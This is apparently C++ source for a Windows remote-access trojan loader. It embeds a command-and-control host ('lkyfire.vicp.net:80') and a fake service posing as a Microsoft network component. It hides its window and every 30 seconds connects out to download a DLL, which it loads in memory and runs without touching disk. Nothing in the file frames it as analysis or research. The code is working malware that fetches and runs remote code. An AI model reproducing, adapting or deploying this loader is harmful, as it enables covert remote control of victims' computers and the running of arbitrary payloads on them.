
#include "stdafx.h"
#include "windows.h"
#include <winsock2.h>
#pragma comment (lib, "Ws2_32.lib")

//#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
//#pragma comment(linker,"/ENTRY:WinMain")

//#include "MemLoadDll.h"
#include "MemoryModule.h"

struct MODIFY_DATA
{
	char  strIPFile[128];   //ip�ļ�or DNS						0
	char  strVersion[16];   //����˰汾							128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-�滻����FALSE-�½�����		148
	char  strSvrName[32];   //��������							149
	char  strSvrDisp[100];  //������ʾ							181
	char  strSvrDesc[100];  //��������							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
} modify_data =
{
	"lkyfire.vicp.net:80",
	"20170507",
	405,
	FALSE,
	"WinNetCenter",
	"Microsoft(R) Multi Protocol Network Control Center",
	"Provides supports for multi network Protocol. This service can not be stopped.",
	"127.0.0.1", //lkyfire.vicp.net
	80
};

unsigned long _stdcall resolve(char *host)
{
	long i = inet_addr(host);

	if (i == INADDR_NONE) //Not Ip
	{
		struct hostent *ser = (struct hostent*)gethostbyname(host);

		if (ser == NULL)
		{
			ser = (struct hostent*)gethostbyname(host); //retry
		}

		if (ser != NULL)
		{
			return (*(unsigned long *)ser->h_addr);
		}

		return 0;
	}

	return i;
}

DWORD _stdcall ConnectThread(LPVOID lParam)
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_port = htons(modify_data.ServerPort);
	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);

	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);

	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		MsgErr("Can't Connect to Dll Server");

		return 0; //connect error
	}

	TurnonKeepAlive(MainSocket, 60);

	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_DLLLOADER;
	msgHead.dwSize = 0;

	if (!SendMsg(MainSocket, NULL, &msgHead))
	{
		MsgErr("Loader Request Can't Send");
		shutdown(MainSocket, 0x02);
		closesocket(MainSocket);

		return 1;
	}

	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
	{
		MsgErr("Can't Recv Dll Data Head");
		shutdown(MainSocket, 0x02);
		closesocket(MainSocket);

		return 1;
	}

	char *buf = (char *)VirtualAlloc(msgHead.dwSize);

	if (!RecvData(MainSocket, buf, msgHead.dwSize))
	{
		MsgErr("Can't Recv Dll Data");
		VirtualFree(buf, msgHead.dwSize);
		shutdown(MainSocket, 0x02);
		closesocket(MainSocket);

		return 1;
	}

	shutdown(MainSocket, 0x02);
	closesocket(MainSocket);

	DWORD iRet;

	if (msgHead.dwCmd == CMD_DLLDATA)
	{
		HMEMORYMODULE hModule = MemoryLoadLibrary(buf, msgHead.dwSize);
		VirtualFree(buf, msgHead.dwSize);

		if (hModule == NULL)
		{
			MsgErr(_T("Load Dll Err"));

			return 2;
		}

		typedef DWORD (*_RoutineMain)(LPVOID lp);

		_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
		iRet = RoutineMain((LPVOID)&modify_data);
		MemoryFreeLibrary(hModule);
	}
	else
	{
		MsgErr("Received dll incorrect");
		VirtualFree(buf, msgHead.dwSize);
		return 2;
	}

	return iRet;
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		GetModuleHandleW(0),
		NULL
		);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	GetInputState();
	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);

	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);

	while (true)
	{
		__try
		{
			if (ConnectThread(NULL) == STATE_EXIT)
			{
				Dbp("Exit Request to loader");
				break;
			}
		}
		__except (1)
		{
			MsgErr("ConnectThread Exception");
		}

#ifdef NDEBUG
		Sleep(30000);
#endif
	}

	WSACleanup();

	return 0;
}
